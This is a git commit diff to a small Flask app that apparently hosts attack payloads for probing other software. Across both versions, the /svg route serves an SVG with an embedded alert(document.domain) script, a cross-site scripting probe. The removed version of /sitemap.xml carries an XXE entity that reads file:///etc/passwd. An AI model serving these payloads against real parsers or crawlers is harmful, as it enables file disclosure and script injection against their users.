21cd6164c19ef36a4bd8e124203e7a4d5f42be53
w41bu1 <buivanyk4@gmail.com>
2025-09-29 01:23:34 +0700

    Add /sitemap.xml route

--- api/index.py
+++ api/index.py
@@ -2,37 +2,31 @@ from flask import Flask, Response
 
 app = Flask(__name__)
 
-@app.route("/")
+@app.route('/')
 def home():
-    return "Hello, World!"
+    return 'Hello, World!'
 
-@app.route("/svg")
-def svg():
-    svg_content = """<?xml version="1.0" encoding="UTF-8"?>
-<svg xmlns="http://www.w3.org/2000/svg">
-    <script>alert(document.domain)</script>
-</svg>"""
-    return Response(svg_content, mimetype="image/svg+xml")
+@app.route('/svg')
+def about():
+    svg = """<?xml version="1.0" encoding="UTF-8"?>
+    <svg xmlns="http://www.w3.org/2000/svg">
+        <script>alert(document.domain)</script>
+    </svg>"""
+    return Response(svg, mimetype="image/svg+xml")
 
 @app.route("/sitemap.xml")
 def sitemap():
-    # thêm BOM (\xEF\xBB\xBF) + newline trước XML
-    xml_bytes = (
-        b"\xEF\xBB\xBF\n"
-        b"<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n"
-        b"<!DOCTYPE urlset [\n"
-        b"    <!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n"
-        b"]>\n"
-        b"<urlset xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n"
-        b"  <url>\n"
-        b"    <loc>https://example.com/?abc=&xxe;</loc>\n"
-        b"    <lastmod>2025-07-30</lastmod>\n"
-        b"    <changefreq>daily</changefreq>\n"
-        b"    <priority>1.0</priority>\n"
-        b"  </url>\n"
-        b"</urlset>"
-    )
-    return Response(xml_bytes, content_type="application/xml; charset=utf-8")
+    xml_content = """<?xml version="1.0" encoding="UTF-8"?>
+    <urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
+        <url>
+            <loc>http://localhost:5000/page1</loc>
+        </url>
+        <url>
+            <loc>http://localhost:5000/page2</loc>
+        </url>
+        <url>
+            <loc>http://localhost:5000/page3</loc>
+        </url>
+    </urlset>"""
 
-if __name__ == "__main__":
-    app.run(debug=True)
+    return Response(xml_content, mimetype="application/xml")
